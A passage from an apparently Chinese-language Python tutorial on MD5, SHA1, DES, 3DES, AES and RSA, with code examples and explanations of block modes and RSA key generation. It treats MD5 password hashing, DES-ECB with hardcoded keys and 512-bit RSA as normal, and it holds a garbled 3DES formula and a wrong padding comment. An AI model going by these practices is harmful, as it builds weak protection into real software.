hl<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'MD5加密前为 ：'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">)</span>
<span class="token comment"># hl.hexdigest()) #拿到加密字符串</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'MD5加密后为 ：'</span> <span class="token operator">+</span> hl<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">"""
MD5加密前为 ：中国你好
MD5加密后为 ：560a6b11a85d436acfa4bd7f34462f40
"""</span>

hash3 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token string">'abd'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">''' 
如果没有参数，所以md5遵守一个规则，生成同一个对应关系，如果加了参数，
就是在原先加密的基础上再加密一层，这样的话参数只有自己知道，防止被撞库，
因为别人永远拿不到这个参数
'''</span>
hash3<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>hash3<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 9aea3c0a6c51555c1a4d0a5e9b689ded</span>
</code></pre>
<p>MD5不仅仅是上面这个例子这样用来处理字符串，还有更广泛的用途：</p>
<ul>
<li>加密网站注册用户的密码。 （但去年的各大网站密码泄漏事件确实让人蛋疼……）</li>
<li>网站用户上传图片 / 文件后，计算出MD5值作为文件名。（MD5可以保证唯一性）</li>
<li>key-value数据库中使用MD5值作为key。</li>
<li>比较两个文件是否相同。（大家在下载一些资源的时候，就会发现网站提供了MD5值，就是用来检测文件是否被篡改）</li>
<li>……</li>
</ul>
<p><strong>处理大文件：</strong></p>
<p>上面说过可以用MD5来检测两个文件是否相同，但想想，如果是两个很大的文件，担心内存不够用，这时怎么办？</p>
<p>这就要使用 update 方法了。代码如下：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
 
<span class="token keyword">def</span> <span class="token function">get_file_md5</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>
    m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">10240</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>
            <span class="token keyword">break</span>
 
        m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
 
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>YOUR_FILE<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    file_md5 <span class="token operator">=</span> get_file_md5<span class="token punctuation">(</span>f<span class="token punctuation">)</span>
 </code></pre>
<p>以上的加密算法虽然非常厉害，但还是存在缺陷，即：通过撞库可以反解，所以，有必要对加密算法中添加自定义key再来做加密</p>
<p><strong>5、MD5长度</strong></p>
<p>md5的长度，默认为128bit，也就是128个0和1的二进制串。这样表达是很不友好的。所以将二进制转成了16进制，每4个bit表示一个16进制，所以128/4 = 32 换成16进制表示后，为32位了。</p>
<p>为什么网上还有md5是16位的呢？</p>
<p>其实16位的长度，是从32位md5值来的。是将32位md5去掉前八位，去掉后八位得到的。</p>
<p><strong>6、sha1 加密</strong></p>
<p>SHA1的全称是Secure Hash Algorithm(安全哈希算法) 。SHA1基于MD5，加密后的数据长度更长，</p>
<p>它对长度小于264的输入，产生长度为160bit的散列值。比MD5多32位。</p>
<p>因此，比MD5更加安全，但SHA1的运算速度就比MD5要慢了。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
 
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"中国你好"</span>
a <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sha1加密前为 ："</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sha1加密前后 ："</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span>
 
<span class="token triple-quoted-string string">"""
sha1加密前为 ： 中国你好
sha1加密前后 ： 3e6c570876775d0031dbf66247ed1054d4ef695e
"""</span></code></pre>
<h3 id="PyCryptodome">PyCryptodome</h3>
<p>PyCrypto是 Python 中密码学方面最有名的第三方软件包。可惜的是，它的开发工作于2012年就已停止。</p>
<p>幸运的是，有一个该项目的分支 PyCrytodome 取代了 PyCrypto 。</p>
<h4 id="1、安装与导入">1、安装与导入</h4>
<p>安装之前需要先安装<strong>Microsoft Visual c++ 2015</strong>。</p>
<p>在Linux上安装，可以使用以下 pip 命令：</p>
<pre class="language-none"><code class="language-none">pip install pycryptodome</code></pre>
<p>导入：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> Crypto</code></pre>
<p>在Windows 系统上安装则稍有不同：</p>
<pre class="language-python" data-language="python"><code class="language-python">pip install pycryptodomex</code></pre>
<p>导入：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> Cryptodome</code></pre>
<h4 id="2、DES">2、DES</h4>
<p><strong>1)简介</strong></p>
<p>DES算法为密码体制中的对称密码体制，又被称为美国数据加密标准。</p>
<p>DES是一个分组加密算法，典型的DES以64位为分组对数据加密，加密和解密用的是同一个算法。</p>
<p>DES算法的入口参数有三个：Key、Data、Mode。其中Key为7个字节共56位，是DES算法的工作密钥；Data为8个字节64位，是要被加密或被解密的数据；Mode为DES的工作方式,有两种:加密或解密。</p>
<p>密钥长64位，密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位，使得每个密钥都有奇数个1），分组后的明文组和56位的密钥按位替代或交换的方法形成密文组。</p>
<p>算法步骤<br>
1）初始置换<br>
其功能是把输入的64位数据块按位重新组合,并把输出分为L0、R0两部分,每部分各长3 2位,其置换规则为将输入的第58位换到第一位,第50位换到第2位……依此类推,最后一位是原来的第7位。L0、R0则是换位输出后的两部分，L0是输出的左32位,R0是右32位,例:设置换前的输入值为D1D2D3……D64,则经过初始置换后的结果为:L0=D58D50……D8;R0=D57D49……D7。<br>
其置换规则见下表：<br>
58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4,<br>
62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8,<br>
57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3,<br>
61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7,<br>
2）逆置换<br>
经过16次迭代运算后,得到L16、R16,将此作为输入,进行逆置换,逆置换正好是初始置换的逆运算，由此即得到密文输出。<br>
此算法是对称加密算法体系中的代表,在计算机网络系统中广泛使用.</p>
<p>加密和解密的过程</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 导入DES模块</span>
<span class="token keyword">from</span> Cryptodome<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> DES
<span class="token keyword">import</span> binascii
 
<span class="token comment"># 这是密钥,此处需要将字符串转为字节</span>
key <span class="token operator">=</span> <span class="token string">b'abcdefgh'</span>
 
<span class="token comment"># 需要去生成一个DES对象</span>
<span class="token keyword">def</span> <span class="token function">pad</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
     <span class="token triple-quoted-string string">"""
       # 加密函数，如果text不是8的倍数【加密文本text必须为8的倍数！】，那就补足为8的倍数
        :param text:
        :return:
     """</span>
     <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        text <span class="token operator">+=</span> <span class="token string">' '</span>
     <span class="token keyword">return</span> text
 
<span class="token comment"># 创建一个DES实例</span>
des <span class="token operator">=</span> DES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span>DES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>
text <span class="token operator">=</span><span class="token string">"I'm china!"</span>
padded_text <span class="token operator">=</span> pad<span class="token punctuation">(</span>text<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>padded_text<span class="token punctuation">)</span>
<span class="token comment">#加密</span>
encrypted_text <span class="token operator">=</span> des<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>padded_text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>encrypted_text<span class="token punctuation">)</span>
<span class="token comment"># rstrip(' ')返回从字符串末尾删除所有字符串的字符串(默认空白字符)的副本</span>
 
<span class="token comment"># 解密</span>
plain_text <span class="token operator">=</span> des<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>encrypted_text<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>plain_text<span class="token punctuation">)</span>
 
<span class="token triple-quoted-string string">"""
I'm china!      
b'\xc0`I\x15\x8bo\x00\x00\xb0\xe27\xfe)\xc3\xde,'
I'm china!
"""</span>
</code></pre>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 导入DES模块</span>
<span class="token keyword">from</span> Cryptodome<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> DES
<span class="token keyword">import</span> binascii
 
<span class="token comment"># 这是密钥</span>
key <span class="token operator">=</span> <span class="token string">b'abcdefgh'</span>
<span class="token comment"># 需要去生成一个DES对象</span>
des <span class="token operator">=</span> DES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> DES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>
<span class="token comment"># 需要加密的数据</span>
text <span class="token operator">=</span> <span class="token string">'python spider!'</span>
text <span class="token operator">=</span> text <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">'='</span>
<span class="token comment"># 加密的过程</span>
encrypto_text <span class="token operator">=</span> des<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 加密过后二进制转化为ASCII </span>
encrypto_text <span class="token operator">=</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>encrypto_text<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>encrypto_text<span class="token punctuation">)</span>
<span class="token comment"># 解密需要ASCII 先转化为二进制 然后再进行解密</span>
plaint <span class="token operator">=</span> des<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>encrypto_text<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>plaint<span class="token punctuation">)</span>
 
<span class="token triple-quoted-string string">"""
b'084725d8f5ffafc61814fae0796bfd2f'
b'python spider!=='
"""</span>
</code></pre>
<h4 id="3、3DES">3、3DES</h4>
<p>3DES（或称为Triple DES）是三重数据加密算法（TDEA，Triple Data Encryption Algorithm）块密码的通称。它相当于是对每个数据块应用三次DES加密算法。</p>
<p>由于计算机运算能力的增强，原版DES密码的密钥长度变得容易被暴力破解。3DES即是设计用来提供一种相对简单的方法，即通过增加DES的密钥长度来避免类似的攻击，而不是设计一种全新的块密码算法。</p>
<p>3DES（即Triple DES）是DES向AES过渡的加密算法（1999年，NIST将3-DES指定为过渡的加密标准），加密算法，其具体实现如下：设Ek()和Dk()代表DES算法的加密和解密过程，K代表DES算法使用的密钥，M代表明文，C代表密文，这样：</p>
<p>3DES加密过程为：C=Ek3(Dk2(Ek1(M)))</p>
<p>3DES解密过程为：M=Dk1(EK2(Dk3©))</p>
<h4 id="4、AES">4、AES</h4>
<p><strong>1）简介</strong></p>
<p>高级加密标准（英语：Advanced Encryption Standard，缩写：AES），在密码学中又称Rijndael加密法，是美国联邦政府采用的一种区块加密标准。这个标准用来替代原先的DES，已经被多方分析且广为全世界所使用。经过五年的甄选流程，高级加密标准由美国国家标准与技术研究院（NIST）于2001年11月26日发布于FIPS PUB 197，并在2002年5月26日成为有效的标准。2006年，高级加密标准已然成为对称密钥加密中最流行的算法之一。</p>
<p>AES在软件及硬件上都能快速地加解密，相对来说较易于实作，且只需要很少的存储器。作为一个新的加密标准，目前正被部署应用到更广大的范围。<br>
特点与思想：抵抗所有已知的攻击。 在多个平台上速度快，编码紧凑。 设计简单。</p>
<p><img src="https://s2.loli.net/2022/01/25/wBu6hHKlVs2EiOf.png" alt=""></p>
<p>AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同。</p>
<p>一般常用的是128位</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Cryptodome<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">from</span> Cryptodome <span class="token keyword">import</span> Random
 
<span class="token keyword">from</span> binascii <span class="token keyword">import</span> a2b_hex
 
<span class="token comment"># 要加密的明文</span>
data <span class="token operator">=</span> <span class="token string">'南来北往'</span>
<span class="token comment"># 密钥key必须为 16（AES-128）， 24（AES-192）， 32（AES-256）</span>
key <span class="token operator">=</span> <span class="token string">b'this is a 16 key'</span>
<span class="token comment"># 生成长度等于AES 块大小的不可重复的密钥向量</span>
iv <span class="token operator">=</span> Random<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>iv<span class="token punctuation">)</span>
<span class="token comment"># 使用 key 和iv 初始化AES 对象， 使用MODE_CFB模式</span>
mycipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CFB<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>mycipher<span class="token punctuation">)</span>
<span class="token comment"># 加密的明文长度必须为16的倍数， 如果长度不为16的倍数， 则需要补足为16的倍数</span>
<span class="token comment"># 将iv(密钥向量)加到加密的密钥开头， 一起传输</span>
ciptext <span class="token operator">=</span> iv <span class="token operator">+</span> mycipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 解密的话需要用key 和iv 生成的AES对象</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>ciptext<span class="token punctuation">)</span>
mydecrypt <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CFB<span class="token punctuation">,</span> ciptext<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment"># 使用新生成的AES 对象， 将加密的密钥解密</span>
decrytext <span class="token operator">=</span> mydecrypt<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>ciptext<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
 
<span class="token keyword">print</span><span class="token punctuation">(</span>decrytext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<h5 id="ECB模式">ECB模式</h5>
<p>ECB模式（电子密码本模式：Electronic codebook）</p>
<p>ECB是最简单的块密码加密模式，加密前根据加密块大小（如AES为128位）分成若干块，之后将每块使用相同的密钥单独加密，解密同理。</p>
<p><img src="https://s2.loli.net/2022/01/25/9IgSEAuJj1wvlHp.jpg" alt=""></p>
<p><strong>优缺点</strong></p>
<p>ECB模式作为一种基本工作模式，具有操作简单，易于实现的特点。同时由于其分组的独立性，利于实现并行处理，并且能很好地防止误差传播。</p>
<p>另一方面由于所有分组的加密方式一致，明文中的重复内容会在密文中有所体现，因此难以抵抗统计分析攻击。</p>
<p>因此，ECB模式一般只适用于小数据量的字符信息的安全性保护，例如密钥保护。</p>
<h5 id="CBC模式">CBC模式</h5>
<p>CBC模式（密码分组链接：Cipher-block chaining）</p>
<p>CBC模式对于每个待加密的密码块在加密前会先与前一个密码块的密文异或然后再用加密器加密。第一个明文块与一个叫初始化向量的数据块异或。</p>
<p><img src="https://s2.loli.net/2022/01/25/ORhX5fjd4sLrcvU.png" alt=""></p>
<h5 id="计算器模式">计算器模式</h5>
<p>计算器模式（Counter (CTR)）</p>
<p>计算器模式不常见，在CTR模式中，<br>
有一个自增的算子，这个算子用密钥加密之后的输出和明文异或的结果得到密文，相当于一次一密。这种加密方式简单快速，安全可靠，而且可以并行加密，但是在计算器不能维持很长的情况下，密钥只能使用一次。CTR的示意图如下所示：</p>
<p><img src="https://s2.loli.net/2022/01/25/ME1WiNg5daJL2kB.png" alt=""></p>
<h5 id="密码反馈模式">密码反馈模式</h5>
<p>密码反馈模式（Cipher FeedBack (CFB)）</p>
<p>与ECB和CBC模式只能够加密块数据不同，CFB能够将块密文（Block Cipher）转换为流密文（Stream Cipher）。</p>
<p><img src="https://s2.loli.net/2022/01/25/Lf1nByvaoR9sUcA.png" alt=""></p>
<p>注意:CFB、OFB和CTR模式中解密也都是用的加密器而非解密器。<br>
CFB的加密工作分为两部分：</p>
<p>将一前段加密得到的密文再加密；<br>
将第1步加密得到的数据与当前段的明文异或。<br>
由于加密流程和解密流程中被块加密器加密的数据是前一段密文，因此即使明文数据的长度不是加密块大小的整数倍也是不需要填充的，这保证了数据长度在加密前后是相同的。</p>
<h4 id="5、RSA">5、RSA</h4>
<p>使用之前需要安装 rsa 模块</p>
<pre class="language-none"><code class="language-none">pip install rsa</code></pre>
<h5 id="应用场景">应用场景</h5>
<p>在公开密钥加密和电子商业中RSA被广泛使用。</p>
<p>该算法基于一个十分简单的数论事实：将两个大素数相乘十分容易，但那时想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥，即公钥，而两个大素数组合成私钥。公钥是可发布的供任何人使用，私钥则为自己所有，供解密之用</p>
<h5 id="非对称加密算法">非对称加密算法</h5>
<p>1、乙方生成两把密钥（公钥和私钥）。公钥是公开的，任何人都可以获得，私钥则是保密的。</p>
<p>2、甲方获取乙方的公钥，然后用它对信息加密。</p>
<p>3、乙方得到加密后的信息，用私钥解密。</p>
<h5 id="RSA算法">RSA算法</h5>
<p>1977年，三位数学家Rivest、Shamir 和 Adleman 设计了一种算法，可以实现非对称加密。这种算法用他们三个人的名字命名，叫做RSA算法。从那时直到现在，RSA算法一直是最广为使用的&quot;非对称加密算法&quot;。毫不夸张地说，只要有计算机网络的地方，就有RSA算法。</p>
<p>这种算法非常可靠，密钥越长，它就越难破解。根据已经披露的文献，目前被破解的最长RSA密钥是768个二进制位。也就是说，长度超过768位的密钥，还无法破解（至少没人公开宣布）。因此可以认为，1024位的RSA密钥基本安全，2048位的密钥极其安全。</p>
<h5 id="数学基础">数学基础</h5>
<p><strong>互质关系</strong></p>
<p>如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是互质关系（coprime）。比如，15和32没有公因子，所以它们是互质关系。这说明，不是质数也可以构成互质关系。</p>
<p>关于互质关系，不难得到以下结论：</p>
<ol>
<li>
<p>任意两个质数构成互质关系，比如13和61。</p>
</li>
<li>
<p>一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。</p>
</li>
<li>
<p>如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。</p>
</li>
<li>
<p>1和任意一个自然数是都是互质关系，比如1和99。</p>
</li>
<li>
<p>p是大于1的整数，则p和p-1构成互质关系，比如57和56。</p>
</li>
<li>
<p>p是大于1的奇数，则p和p-2构成互质关系，比如17和15。</p>
</li>
</ol>
<p><strong>欧拉函数</strong></p>
<p>请思考以下问题：</p>
<p>任意给定正整数n，请问在小于等于n的正整数之中，有多少个与n构成互质关系？（比如，在1到8之中，有多少个数与8构成互质关系？）</p>
<p>计算这个值的方法就叫做欧拉函数，以φ(n)表示。在1到8之中，与8形成互质关系的是1、3、5、7，所以 φ(n) = 4。</p>
<p>φ(n) 的计算方法并不复杂，但是为了得到最后那个公式，需要一步步讨论。</p>
<h5 id="密钥生成">密钥生成</h5>
<p>我们通过一个例子，来理解RSA算法。假设爱丽丝要与鲍勃进行加密通信，她该怎么生成公钥和私钥呢？</p>
<p><img src="https://s2.loli.net/2022/01/25/EqGaUCgbzyJ3xS9.png" alt=""></p>
<ul>
<li>第一步，随机选择两个不相等的质数p和q。</li>
</ul>
<p>爱丽丝选择了61和53。（实际应用中，这两个质数越大，就越难破解。）</p>
<ul>
<li>第二步，计算p和q的乘积n。</li>
</ul>
<p>爱丽丝就把61和53相乘。</p>
<p>n = 61×53 = 3233</p>
<p>n的长度就是密钥长度。3233写成二进制是110010100001，一共有12位，所以这个密钥就是12位。实际应用中，RSA密钥一般是1024位，重要场合则为2048位。</p>
<ul>
<li>第三步，计算n的欧拉函数φ(n)。</li>
</ul>
<p>根据公式：</p>
<p>φ(n) = (p-1)(q-1)</p>
<p>爱丽丝算出φ(3233)等于60×52，即3120。</p>
<ul>
<li>第四步，随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质。</li>
</ul>
<p>爱丽丝就在1到3120之间，随机选择了17。（实际应用中，常常选择65537。）</p>
<ul>
<li>第五步，计算e对于φ(n)的模反元素d。</li>
</ul>
<p>所谓&quot;模反元素&quot;就是指有一个整数d，可以使得ed被φ(n)除的余数为1。</p>
<p>ed ≡ 1 (mod φ(n))</p>
<p>这个式子等价于</p>
<p>ed - 1 = kφ(n) (k∈Z)</p>
<p>于是，找到模反元素d，实质上就是对下面这个二元一次方程求解。</p>
<p>ex + φ(n)y = 1</p>
<p>已知 e=17, φ(n)=3120，</p>
<p>17x + 3120y = 1</p>
<p>这个方程可以用&quot;扩展欧几里得算法&quot;求解，此处省略具体过程。总之，爱丽丝算出一组整数解为 (x,y)=(2753,-15)，即 d=2753。</p>
<p>至此所有计算完成。</p>
<ul>
<li>第六步，将n和e封装成公钥，n和d封装成私钥。</li>
</ul>
<p>在爱丽丝的例子中，n=3233，e=17，d=2753，所以公钥就是 (3233,17)，私钥就是（3233, 2753）。</p>
<ul>
<li>总结，实际上就是计算n,e,d的过程</li>
</ul>
<p>pq的作用用于求n==pq，再用 (p-1)(q-1)求φ(n)，在φ(n)范围内随机选择即为e，d==e对于φ(n)的模反元素</p>
<h5 id="代码案例">代码案例</h5>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> rsa
 
 
<span class="token comment"># rsa加密</span>
<span class="token keyword">def</span> <span class="token function">rsaEncrypt</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 生成公钥、私钥</span>
    <span class="token punctuation">(</span>pubkey<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span> <span class="token operator">=</span> rsa<span class="token punctuation">.</span>newkeys<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"pub: "</span><span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"priv: "</span><span class="token punctuation">,</span> privkey<span class="token punctuation">)</span>
    <span class="token comment"># 明文编码格式</span>
    content <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    <span class="token comment"># 公钥加密</span>
    crypto <span class="token operator">=</span> rsa<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>content<span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>crypto<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span>
 
 
<span class="token comment"># rsa解密</span>
<span class="token keyword">def</span> <span class="token function">rsaDecrypt</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span> pk<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 私钥解密</span>
    content <span class="token operator">=</span> rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span> pk<span class="token punctuation">)</span>
    con <span class="token operator">=</span> content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> con
 
 
a<span class="token punctuation">,</span> b <span class="token operator">=</span> rsaEncrypt<span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'加密后密文：'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
content <span class="token operator">=</span> rsaDecrypt<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'解密后明文：'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>  
</code></pre>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> rsa
<span class="token keyword">import</span> binascii
 
<span class="token keyword">def</span> <span class="token function">rsa_encrypt</span><span class="token punctuation">(</span>rsa_n<span class="token punctuation">,</span> rsa_e<span class="token punctuation">,</span> message<span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PublicKey<span class="token punctuation">(</span>rsa_n<span class="token punctuation">,</span> rsa_e<span class="token punctuation">)</span>
    message <span class="token operator">=</span> rsa<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>message<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>
    message <span class="token operator">=</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>message<span class="token punctuation">)</span>
    <span class="token keyword">return</span> message<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
 
pubkey_n <span class="token operator">=</span> <span class="token string">'8d7e6949d411ce14d7d233d7160f5b2cc753930caba4d5ad24f923a505253b9c39b09a059732250e56c594d735077cfcb0c3508e9f544f101bdf7e97fe1b0d97f273468264b8b24caaa2a90cd9708a417c51cf8ba35444d37c514a0490441a773ccb121034f29748763c6c4f76eb0303559c57071fd89234d140c8bb965f9725'</span>
pubkey_e <span class="token operator">=</span> <span class="token string">'10001'</span>
rsa_n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>pubkey_n<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
rsa_e <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>pubkey_e<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
message <span class="token operator">=</span> <span class="token string">'南北今天很忙'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"公钥n值长度："</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pubkey_n<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
